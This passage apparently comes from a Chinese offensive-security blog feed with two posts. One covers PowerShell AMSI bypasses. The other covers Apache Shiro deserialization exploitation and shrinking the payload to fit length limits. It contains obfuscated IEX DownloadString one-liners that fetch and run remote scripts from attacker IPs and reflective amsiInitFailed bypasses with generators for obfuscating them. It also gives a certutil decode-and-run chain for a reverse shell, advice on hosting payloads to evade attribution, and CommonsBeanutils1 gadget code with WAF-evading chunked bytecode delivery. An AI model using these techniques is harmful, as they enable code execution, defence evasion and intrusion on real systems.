+<blockquote>
+<p>将样本托管GitHub，虽然虽不会被防病毒标记，但是在实战攻防中非常容易就被蓝队溯源出个人信息,这边推荐一个可以在公网上挂起文本并且合法的网站<a href="https://paste.ee/">https://paste.ee/</a>,也可以创建一个github小号进行利用</p>
+</blockquote>
+<pre><code class="language-powershell">IEX([Net.Webclient]::new().DownloadString(&quot;h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t&quot;.Replace('@@@@@','').Replace('%%%','')))
+IEX ((new-object net.webclient).downloadstring(&quot;ht@@@@@tp://1@@@@@0@!#$%^&amp;*()1.3@@@@@9.xx.xx8:7@!#$%^&amp;*()77/tt**************s.tx**************t&quot;.Replace('@@@@@','').Replace('@!#$%^&amp;*()','').Replace('**************',''))
+
+
+
+
+$webreq = [System.Net.WebRequest]::Create(‘0.0.0.0/1.ps1’)
+$resp=$webreq.GetResponse()
+$respstream=$resp.GetResponseStream()
+$reader=[System.IO.StreamReader]::new($respstream)
+$content=$reader.ReadToEnd()
+IEX($content)
+
+</code></pre>
+<h2 id="amsi强制报错">AMSI强制报错</h2>
+<p>强制AMSI初始化失败(amsiInitFailed)将导致不会为当前进程启动扫描.目前微软已经开发了一个签名来防止更广泛的使用</p>
+<pre><code class="language-csharp">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+原理已经被很多文章分析: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-loggi
+ng-evasion/,具体的小伙伴可以阅读以上文章,简单的说就是利用反射直接把判断是否要使用杀毒软件
+进行扫描的变量始终改成false。这样AMSI就不会把我们的恶意脚本交给杀毒软件,而是直接返回
+AMSI_RESULT_NOT_DETECTED
+
+//混淆
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)
+    
+//另外一个混淆
+//System.Management.Automation.AmsiUtils和amsiInitFailed的编码数据
+$a=&quot;5492868772801748688168747280728187173688878280688776828&quot;
+$b=&quot;1173680867656877679866880867644817687416876797271&quot;
+//对System.Management.Automation.AmsiUtils进行解码
+$c=[string](0..37|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace &quot; &quot;
+$d=[Ref].Assembly.GetType($c)
+//对amsiInitFailed进行解码
+$e=[string](38..51|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace &quot; &quot;
+$f=$d.GetField($e,'NonPublic,Static')
+//组合起来执行
+$f.SetValue($null,$true)
+</code></pre>
+<pre><code class="language-csharp">payload1='System.Management.Automation.AmsiUtils'
+payload2='amsiInitFailed'
+key=29 #偏差是多少 比如这里是29
+payload=payload1+payload2
+result=''
+for i in payload:
+    result+=str(ord(i)-key)#ASCII每个字符再减去key的值
+print('$a=&quot;'+result[0:len(result)//2]+'&quot;')#分割，这里对半分的。注意在这里面的除法需要两个/
+print('$b=&quot;'+result[len(result)//2:]+'&quot;')
+print('$c=[string](0..'+str(len(payload1)-1)+'|%{[char][int]('+str(key)+'+($a+$b).substring(($_*2),2))})-replace &quot; &quot;')#解码语句，应用到别的bypass场景或许也可以
+print(&quot;$d=[Ref].Assembly.GetType($c)&quot;)
+print('$e=[string]('+str(len(payload1))+&quot;..&quot;+str(len(payload1)+len(payload2)-1)+' |%{[char][int]('+str(key)+'+($a+$b).substring(($_ * 2), 2))})-replace&quot; &quot;') #关键解码语句
+
+print(&quot;$f=$d.GetField($e,'NonPublic,Static')&quot;)
+print(&quot;$f.SetValue($null,$true)&quot;)payload1='System.Management.Automation.AmsiUtils'
+payload2='amsiInitFailed'
+key=29 #偏差是多少 比如这里是29
+payload=payload1+payload2
+result=''
+for i in payload:
+result+=str(ord(i)-key)#ASCII每个字符再减去key的值
+print('$a=&quot;'+result[0:len(result)//2]+'&quot;')#分割，这里对半分的。注意在
+这里面的除法需要两个/
+print('$b=&quot;'+result[len(result)//2:]+'&quot;')
+print('$c=[string](0..'+str(len(payload1)-1)+'|%{[char][int]
+('+str(key)+'+($a+$b).substring(($_*2),2))})-replace &quot; &quot;')#解码语
+句，应用到别的bypass场景或许也可以
+print(&quot;$d=[Ref].Assembly.GetType($c)&quot;)
+print('$e=[string]
+('+str(len(payload1))+&quot;..&quot;+str(len(payload1)+len(payload2)-1)+'|%
+{[char][int]('+str(key)+'+($a+$b).substring(($_*2),2))})-replace
+&quot; &quot;')#关键解码语句
+print(&quot;$f=$d.GetField($e,'NonPublic,Static')&quot;)
+print(&quot;$f.SetValue($null,$true)&quot;)
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1648375222265-b2a6e129-b9fa-48ea-a0cf-e3936640609e.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648376416739-d69a6a76-cf0d-491b-b63c-fde467e6de0d.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648377008250-3267e7ad-9543-4289-9969-1d6d7228cf8a.png" alt="image.png" loading="lazy"><br>
+amsiContext分配内存区域,并且由于&quot;amsiSession&quot;设置为Null将导致错误</p>
+<pre><code class="language-csharp">$mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiSession&quot;,&quot;NonPublic,Static&quot;).SetValue($null, $null);[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiContext&quot;,&quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$mem)
+//不免杀,因为Amsi标记了System.Management.Automation.AmsiUtils和amsiSession以及amsiContext字段,毕竟都带着amsi字眼
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1648380319845-da8d9b34-0752-49ed-84af-783afac5a8c2.png" alt="image.png" loading="lazy"><br>
+当然也要对其脚本进行混淆</p>
+<pre><code class="language-csharp">import sys
+
+def Cod(payload1,payload2,key):
+    payload=payload1+payload2
+    result=''
+    for i in payload:
+        result+=str(ord(i)-key)#ASCII每个字符再减去key的值
+    print('$a=&quot;'+result[0:len(result)//2]+'&quot;')#分割，这里对半分的。注意在这里面的除法需要两个/
+    print('$b=&quot;'+result[len(result)//2:]+'&quot;')
+    print('$c=[string](0..'+str(len(payload1)-1)+'|%{[char][int]('+str(key)+'+($a+$b).substring(($_*2),2))})-replace &quot; &quot;')#解码语句，应用到别的bypass场景或许也可以
+    print('$e=[string]('+str(len(payload1))+&quot;..&quot;+str(len(payload1)+len(payload2)-1)+' |%{[char][int]('+str(key)+'+($a+$b).substring(($_ * 2), 2))})-replace&quot; &quot;') #关键解码语句
+
+
+if __name__ == '__main__':
+    print(&quot;python main.py 混淆字符串1 混淆字符串2 偏移&quot;)
+    print(&quot;python main.py System.Management.Automation.AmsiUtils Amsisession 30&quot;)
+    if len(sys.argv)!=4:
+        print(&quot;请按照规定输入&quot;)
+        sys.exit(0)
+    Cod(sys.argv[1],sys.argv[2],int(sys.argv[3]))
+</code></pre>
+<h2 id="提醒">提醒</h2>
+<p>windows deference熟悉base64＋IEX套路,最好将其敏感字符串进行单独的编码</p>
+<p>上面是在powershell环境下免杀的<br>
+后发现在cmd下wd会监控<br>
+不过</p>
+<pre><code class="language-python">echo bases64命令 &gt; 1.txt
+certutil -f -decode 1.txt 1.ps1
+powershell -f 1.ps1
+</code></pre>
+<p>base64我使用的是powershell的套接字代码,反弹powershell环境<br>
+不过猜测直接上线也可以</p>
+<h2 id="实战">实战</h2>
+<p><img src="https://pyroxenites.github.io/post-images/1650608387106-121ffb48-9beb-4326-831d-8bef1d7702a6.png" alt="382737acb06bebb98ff7c6f47e2e938.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650608737666-d0e31b22-2128-45d6-b56f-8ade9483db3d.png" alt="image.png" loading="lazy"></p>
+<p>这里直接运用实战，发现可以直接绕过amsi的检测，成功上线</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[shiro 理解以及payload限制长度]]></title>
+        <id>https://pyroxenites.github.io/post/shiro/</id>
+        <link href="https://pyroxenites.github.io/post/shiro/">
+        </link>
+        <updated>2022-04-11T16:00:00.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="shiro反序列化">shiro反序列化</h1>
+<h2 id="原理">原理</h2>
+<blockquote>
+<p>版本1.2.4</p>
+</blockquote>
+<h3 id="下载环境">下载环境</h3>
+<pre><code class="language-go">git clone https://github.com/apache/shiro.git  
+cd shiro
+git checkout shiro-root-1.2.4
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1647137327102-cfd3772a-98f1-4899-964f-2d32c7108fa7.png" alt="image.png" loading="lazy"></figure>
+<h3 id="官方解释">官方解释</h3>
+<p><a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a></p>
+<p><img src="https://pyroxenites.github.io/post-images/1647137435714-4fe79944-ebba-4baa-8518-3022339135ac.png" alt="image.png" loading="lazy"><br>
+在默认情况下Shiro会使用CookieRememberMeManager功能，当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
+<ol>
+<li>检索cookie中RememberMe的值</li>
+<li>Base64解码</li>
+<li>使用AES解密</li>
+<li>反序列化</li>
+</ol>
+<blockquote>
+<p>由于AES加解密的秘钥被硬编码在代码中，这意味着有权访问源代码的任何人都知道默认加密密钥是什么，因此，攻击者可以创建一个恶意对象并对其进行序列化，编码，然后将其作为cookie发送，然后Shiro将解码并反序列化，从而导致恶意代码执行</p>
+</blockquote>
+<hr>
+<h3 id="分析">分析</h3>
+<h4 id="解密过程">解密过程</h4>
+<ol>
+<li>在CookieRememberMeManager类中读取cookie跟踪</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1647150687590-ce0a3941-c134-4ad8-8dfd-c7f670c1c3ec.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>进入readValue()方法,将cookie中的remember字段值赋予value并返回</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1647150749670-4995f346-30dd-40ba-891f-50d7040fcf90.png" alt="image.png" loading="lazy"></figure>
+<ol start="3">
+<li>对数据进行base64解码</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1647150819768-9c309e0e-3494-44c3-b895-642f87d5d090.png" alt="image.png" loading="lazy"></figure>
+<ol start="4">
+<li>进入 AbstractRememberMeManager类中的convertBytesToPrincipals <strong>方法</strong> shiro拿到cookie后的关键代码,先decrypt再反序列化</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1647150998355-7ded709e-7516-4b93-9e19-40eebfc6f14f.png" alt="image.png" loading="lazy"></figure>
+<ol start="5">
+<li>跟到decrypt方法</li>
+</ol>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1647151076598-fe9e24c1-02e2-4b04-aab7-b8eea7fe0d05.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>在getCipherService方法中,获取到加密方法:AES/CBC/PKCS5Padding</p>
+</blockquote>
+<blockquote>
+<p>调用具体的cipherService,传入加密后的数据和cipherKey进行解密<br>
+getDeryptionCipherKey()获取的值也就是这个默认key,硬编码在程序中<br>
+经过base64硬编码的秘钥，因为 AES 是对称加密，即加密密钥也同样是解密密钥</p>
+</blockquote>
+<figure data-type="image" tabindex="7"><img src="https://pyroxenites.github.io/post-images/1647137759957-9fa2f7e9-36d8-499c-9ad0-0560860d44ac.png" alt="image.png" loading="lazy"></figure>
+<ol start="6">
+<li>继续查看decrypt方法,通过cipherService的decrypt来解密数据,跟进后进入JcaCipherService类中的decrypt方法</li>
+</ol>
+<p><img src="https://pyroxenites.github.io/post-images/1647151530340-3dd3d58e-1ae0-431f-a81f-f5aa2d740679.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1647151544112-3e4b54f1-36b3-4f8c-8907-6ceac99b0d3b.png" alt="image.png" loading="lazy"></p>
+<ol start="7">
+<li>继续跟进decrypt方法,完成解密后,返回解密后的数据</li>
+</ol>
+<figure data-type="image" tabindex="8"><img src="https://pyroxenites.github.io/post-images/1647151607803-0993fbc4-3e9f-4469-bb07-4b97a8406ef2.png" alt="image.png" loading="lazy"></figure>
+<ol start="8">
+<li>此时回到AbstractRememberMeManager类中的decrypt方法,可以查看到序列化数据</li>
+</ol>
+<figure data-type="image" tabindex="9"><img src="https://pyroxenites.github.io/post-images/1647151681340-a4e9dbcd-97e1-40d3-908e-817abd62b134.png" alt="image.png" loading="lazy"></figure>
+<ol start="9">
+<li>此时再进入deserialize方法,并进入跟进</li>
+</ol>
+<p><img src="https://pyroxenites.github.io/post-images/1647151768344-20b226b6-3d19-4dd4-8f27-0f0877fc55b6.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1647151788650-542cd13a-84eb-4d1d-8d20-51ff4a00d6c0.png" alt="image.png" loading="lazy"></p>
+<ol start="10">
+<li>此时进入到DefaultSerializer类中的deserialize方法,出现了readobject()</li>
+</ol>
+<figure data-type="image" tabindex="10"><img src="https://pyroxenites.github.io/post-images/1647151974730-17f5c4a4-b113-4c41-9beb-5569803daad2.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>Shiro是默认依赖Commons-Beanutils1.8.3的，那么就可以利用CommonsBeanutils1反序列化链进行构造payload</p>
+</blockquote>
+<figure data-type="image" tabindex="11"><img src="https://pyroxenites.github.io/post-images/1647152489567-dce49996-2dd5-4deb-807b-ed65ccd3ea37.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>一般在登陆状态,会先判断以下JSESSIONID的值,如果修改rememberMe以后没有作用,可以删除一下JSESSIONID</p>
+</blockquote>
+<h2 id="payload需要缩小背景">payload需要缩小背景</h2>
+<p>WAF会对rememberMe长度进行限制,甚至解密payload检查反序列化class</p>
+<blockquote>
+<p>以CommonsBeanutils1链为例</p>
+<ul>
+<li>序列化数据本身缩小</li>
+<li>针对TemplatesImpl中的_bytecodes字节码缩小</li>
+<li>对于执行的代码如何缩小(STATIC代码块)</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>将ysoserial生产的payload缩小</p>
+</blockquote>
+<p><strong><em>缩小前展示</em></strong><br>
+<strong><em>用ysoserial生成CB1链,并进行base64</em></strong></p>
+<blockquote>
+<p>https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar<br>
+mvn clean package -DskipTests</p>
+</blockquote>
+<figure data-type="image" tabindex="12"><img src="https://pyroxenites.github.io/post-images/1647134816639-9d3e6a29-91b9-4730-8c5e-2797a1c22fe6.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://pyroxenites.github.io/post-images/1647134896952-7cdc9d2a-54e2-4516-a8c1-af40fd8cf77f.png" alt="image.png" loading="lazy"></figure>
+<p>长度为3872</p>
+<h2 id="方法">方法</h2>
+<h3 id="尝试自己构造gadget">尝试自己构造Gadget</h3>
+<p>依赖</p>
+<pre><code class="language-go">&lt;dependency&gt;
+    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;
+    &lt;version&gt;1.9.2&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>构造代码</p>
+<pre><code class="language-java">public static byte[] getPayloadUseByteCodes(byte[] byteCodes) {
+    try {
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{byteCodes});
+        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;1&quot;);
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]{templates, templates});
+        return serialize(queue);
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+    return new byte[]{};
+}
+</code></pre>
+<p>恶意类</p>
+<pre><code class="language-java">public class EvilByteCodes extends AbstractTranslet {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
+
+    }
+}
+</code></pre>
+<p>读取字节码并设置到Gadget中，序列化后统计长度：<strong>2728</strong></p>
+<pre><code class="language-java">byte[] evilBytesCode = Files.readAllBytes(Paths.get(&quot;/path/to/EvilByteCodes.class&quot;));
+byte[] my = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(evilBytesCode));
+System.out.println(new String(my).length());
+</code></pre>
+<p>还有三处可以优化：</p>
+<ul>
+<li>设置_name名称可以是一个字符</li>
+<li>其中_tfactory属性可以删除（分析TemplatesImpl得出）</li>
+<li>其中EvilByteCodes类捕获异常后无需处理</li>
+</ul>
+<pre><code class="language-java">setFieldValue(templates, &quot;_name&quot;, &quot;t&quot;);
+// setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+try {
+    Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+} catch (Exception ignored) {
+}
+</code></pre>
+<p>经过这三处优化后得到长度：<strong>2608</strong></p>
+<h3 id="从字节码层面进行优化">从字节码层面进行优化</h3>
+<p>上文中的EvilBytesCode恶意类的字节码是可以缩减的<br>
+对字节码进行分析：javap -c -l EvilByteCodes.class</p>
+<pre><code class="language-java">public class org.sec.payload.EvilByteCodes extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
+  // transform 1 
+  // transform 2
+  // &lt;init&gt;
+  // &lt;clint&gt;
+  static {};
+    Code:
+       0: invokestatic  #2                  // Method java/lang/Runtime.getRuntime:()Ljava/lang/Runtime;
+       3: ldc           #3                  // String
+       5: invokevirtual #4                  // Method java/lang/Runtime.exec:(Ljava/lang/String;)Ljava/lang/Process;
+       8: pop
+       9: goto          13
+      12: astore_0
+      13: return
+    Exception table:
+       from    to  target type
+           0     9    12   Class java/lang/Exception
+    LineNumberTable:
+      line 11: 0
+      line 13: 9
+      line 12: 12
+      line 14: 13
+    LocalVariableTable:
+      Start  Length  Slot  Name   Signature
+}
+</code></pre>
+<p>可以看出，该类每个方法包含了三部分：</p>
+<ul>
+<li>代码对应的字节码</li>
+<li>ExceptionTable和LocalVariableTable</li>
+<li>LineNumberTable</li>
+</ul>
+<p>从JVM相关的知识可以得知，局部变量表和异常表是不能删除的，否则无法执行<br>
+但LineNumberTable是可以删除的<br>
+换句话来说：LINENUMBER指令可以全部删了<br>
+于是基于ASM实现删除LINENUMBER</p>
+<pre><code class="language-java">byte[] bytes = Files.readAllBytes(Paths.get(path));
+ClassReader cr = new ClassReader(bytes);
+ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
+int api = Opcodes.ASM9;
+ClassVisitor cv = new ShortClassVisitor(api, cw);
+int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
+cr.accept(cv, parsingOptions);
+byte[] out = cw.toByteArray();
+Files.write(Paths.get(path), out);
+</code></pre>
+<p>ShortClassVisitor</p>
+<pre><code class="language-java">public class ShortClassVisitor extends ClassVisitor {
+    private final int api;
+
+    public ShortClassVisitor(int api, ClassVisitor classVisitor) {
+        super(api, classVisitor);
+        this.api = api;
+    }
+
+    @Override
+    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
+        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+        return new ShortMethodAdapter(this.api, mv);
+    }
+}
+</code></pre>
+<p>重点在于ShortMethodAdapter：如果遇到LINENUMBER指令则<strong>阻止传递</strong>，可以理解为返回空</p>
+<pre><code class="language-java">public class ShortMethodAdapter extends MethodVisitor implements Opcodes {
+
+    public ShortMethodAdapter(int api, MethodVisitor methodVisitor) {
+        super(api, methodVisitor);
+    }
+
+    @Override
+    public void visitLineNumber(int line, Label start) {
+        // delete line number
+    }
+}
+</code></pre>
+<p>读取编译的字节码并处理后替换</p>
+<pre><code class="language-java">Resolver.resolve(&quot;/path/to/EvilByteCodes.class&quot;);
+byte[] newByteCodes = Files.readAllBytes(Paths.get(&quot;/path/to/EvilByteCodes.class&quot;));
+byte[] payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
+System.out.println(new String(payload).length());
+</code></pre>
+<p>经过优化后得到长度：<strong>1832</strong></p>
+<h3 id="使用javassist构造">使用javassist构造</h3>
+<p>以上代码虽然做到了超过百分之五十的缩小，但存在一个问题：目前的恶意类是写死的，无法动态构造<br>
+想要动态构造字节码一种手段是选择ASM做，但有更好的选择：Javassist<br>
+通过这样的一个方法，就可以根据输入命令动态构造出Evil类</p>
+<pre><code class="language-java">private static byte[] getTemplatesImpl(String cmd) {
+    try {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
+        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);
+        ctClass.setSuperclass(superClass);
+
+        CtConstructor constructor = ctClass.makeClassInitializer();
+        constructor.setBody(&quot;        try {\n&quot; +
+                            &quot;            Runtime.getRuntime().exec(\&quot;&quot; + cmd + &quot;\&quot;);\n&quot; +
+                            &quot;        } catch (Exception ignored) {\n&quot; +
+                            &quot;        }&quot;);
+
+        CtMethod ctMethod1 = CtMethod.make(&quot;    public void transform(&quot; +
+                                           &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +
+                                           &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) {\n&quot; +
+                                           &quot;    }&quot;, ctClass);
+        ctClass.addMethod(ctMethod1);
+
+        CtMethod ctMethod2 = CtMethod.make(&quot;    public void transform(&quot; +
+                                           &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +
+                                           &quot;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, &quot; +
+                                           &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {\n&quot; +
+                                           &quot;    }&quot;, ctClass);
+        ctClass.addMethod(ctMethod2);
+
+        byte[] bytes = ctClass.toBytecode();
+        ctClass.defrost();
+
+        return bytes;
+    } catch (Exception e) {
+        e.printStackTrace();
+        return new byte[]{};
+    }
+}
+</code></pre>
+<p>将动态生成的字节码保存至当前目录，再读取加载</p>
+<pre><code class="language-java">String path = System.getProperty(&quot;user.dir&quot;) + File.separator + &quot;Evil.class&quot;;
+Generator.saveTemplateImpl(path, &quot;calc.exe&quot;);
+byte[] newByteCodes = Files.readAllBytes(Paths.get(&quot;Evil.class&quot;));
+byte[] payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
+System.out.println(new String(payload).length());
+</code></pre>
+<p>经过优化后得到长度：1848</p>
+<p>不难发现使用Javassist生成的字节码似乎本身就不包含LINENUMBER指令<br>
+不过这只是猜测，当使用上文的删除指令代码优化后，发现进一步缩小了</p>
+<pre><code class="language-java">...
+Generator.saveTemplateImpl(path, &quot;calc.exe&quot;);
+Resolver.resolve(&quot;Evil.class&quot;);
+...
+// 验证Payload是否有效    
+Payload.deserialize(Base64.getDecoder().decode(payload));
+</code></pre>
+<p>经过优化后得到长度：<strong>1804</strong></p>
+<h3 id="删除重写方法">删除重写方法</h3>
+<p>可以发现Evil类继承自AbstractTranslet抽象类，所以必须重写两个transform方法<br>
+这样写代码会导致编译不通过，无法执行</p>
+<pre><code class="language-java">public class EvilByteCodes extends AbstractTranslet {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (Exception ignored) {
+        }
+    }
+}
+</code></pre>
+<p>编译不通过不代表非法，通过手段直接构造对应的字节码</p>
+<ol>
+<li>通过ASM删除方法</li>
+</ol>
+<pre><code class="language-java">@Override
+public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
+    if (name.equals(&quot;transform&quot;)) {
+        return null;
+    }
+    MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+    return new ShortMethodAdapter(this.api, mv, name);
+}
+</code></pre>
+<ol start="2">
+<li>通过Javassist直接构造</li>
+</ol>
+<pre><code class="language-java">private static byte[] getTemplatesImpl(String cmd) {
+    try {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
+        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);
+        ctClass.setSuperclass(superClass);
+        CtConstructor constructor = ctClass.makeClassInitializer();
+        constructor.setBody(&quot;        try {\n&quot; +
+                            &quot;            Runtime.getRuntime().exec(\&quot;&quot; + cmd + &quot;\&quot;);\n&quot; +
+                            &quot;        } catch (Exception ignored) {\n&quot; +
+                            &quot;        }&quot;);
+        byte[] bytes = ctClass.toBytecode();
+        ctClass.defrost();
+        return bytes;
+    } catch (Exception e) {
+        e.printStackTrace();
+        return new byte[]{};
+    }
+}
+</code></pre>
+<p>通过以上手段处理后进行反序列化验证：成功弹出计算器</p>
+<pre><code class="language-java">String path = System.getProperty(&quot;user.dir&quot;) + File.separator + &quot;Evil.class&quot;;
+Generator.saveTemplateImpl(path, &quot;calc.exe&quot;);
+Resolver.resolve(&quot;Evil.class&quot;);
+byte[] newByteCodes = Files.readAllBytes(Paths.get(&quot;Evil.class&quot;));
+byte[] payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
+System.out.println(new String(payload).length());
+Payload.deserialize(Base64.getDecoder().decode(payload));
+</code></pre>
+<p>最终优化后得到长度：<strong>1332</strong><br>
+并不是所有方法都能删除，比如不存在构造方法的情况下无法删除空参构造<br>
+于是有了一个新思路：删除静态代码块，将代码写入空参构造</p>
+<pre><code class="language-java">ClassPool pool = ClassPool.getDefault();
+CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
+CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);
+ctClass.setSuperclass(superClass);
+CtConstructor constructor = CtNewConstructor.make(&quot;    public Evil(){\n&quot; +
+                                                  &quot;        try {\n&quot; +
+                                                  &quot;            Runtime.getRuntime().exec(\&quot;&quot; + cmd + &quot;\&quot;);\n&quot; +
+                                                  &quot;        }catch (Exception ignored){}\n&quot; +
+                                                  &quot;    }&quot;, ctClass);
+ctClass.addConstructor(constructor);
+byte[] bytes = ctClass.toBytecode();
+ctClass.defrost();
+return bytes;
+</code></pre>
+<p>最终优化后得到长度：<strong>1296</strong></p>
+<h3 id="分块传输">分块传输</h3>
+<p>以上的内容都在围绕字节码和序列化数据的缩小，已经做到的<strong>接近极致</strong>，很难做到更小的<br>
+对于STATIC代码块中需要执行的代码也有缩小手段，这也是更有实战意义是思考，因为实战中不是弹个计算器这么简单<br>
+因此可以用追加的方式发送多个请求往指定文件中写入字节码，将真正需要执行的字节码分块<br>
+使用Javassist动态生成写入每一分块的Payload，以追加的方式将所有字节码的Base64写入某文件</p>
+<pre><code class="language-java">static {
+    try {
+        String path = &quot;/your/path&quot;;
+        // 创建文件
+        File file = new File(path);
+        file.createNewFile();
+        // 传入true是追加方式写文件
+        FileOutputStream fos = new FileOutputStream(path, true);
+        // 需要写入的数据
+        String data = &quot;BASE64_BYTECODES_PART&quot;;
+        fos.write(data.getBytes());
+        fos.close();
+    } catch (Exception ignore) {
+    }
+</code></pre>
+<p>在最后一个包中将字节码进行Base64Decode并写入class文件<br>
+（也可以直接写字节码二进制数据，不过认为Base64好分割处理一些）</p>
+<pre><code class="language-java">static {
+    try {
+        String path = &quot;/your/path&quot;;
+        FileInputStream fis = new FileInputStream(path);
+        // size取决于实际情况
+        byte[] data = new byte[size];
+        fis.read(data);
+        // 写入Evil.class
+        FileOutputStream fos = new FileOutputStream(&quot;Evil.class&quot;);
+        fos.write(Base64.getDecoder().decode(data));
+        fos.close();
+    } catch (Exception ignored) {
+    }
+}
+</code></pre>
+<h3 id="工具">工具</h3>
+<p><a href="https://github.com/4ra1n/ShortPayload">payload缩小工具</a></p>
+<h2 id="其他问题">其他问题</h2>
+<h3 id="怎样检测目标框架中使用了shiro">怎样检测目标框架中使用了shiro</h3>
+<p>直接查看请求响应中是否由**<em>rememberMe=deleteMe</em>**这样的Cookie</p>
+<h3 id="最新版shiro还存在反序列化漏洞吗">最新版shiro还存在反序列化漏洞吗</h3>
+<p>存在,只要密钥是常见的,还是有反序列化漏洞的可能性的</p>
+<h3 id="shiro反序列化怎么检测key的">shiro反序列化怎么检测key的</h3>
+<p>实例化一个SimplePrincipalCollection并序列化,遍历key列表对该序列化数据进行AES加密<br>
+<img src="https://pyroxenites.github.io/post-images/1646290061088-dc6a0af9-6448-4fd3-a334-432defdf7a15.png" alt="image.png" loading="lazy"></p>
+<pre><code class="language-java">SimplePrincipalCollection sc = new SimplePrincipalCollection();
+byte[] scBytes = Payload.serialize(sc);
+
+
+byte[] keyBytes = Base64.decode(key);
+CipherService cipherService = new AesCipherService();
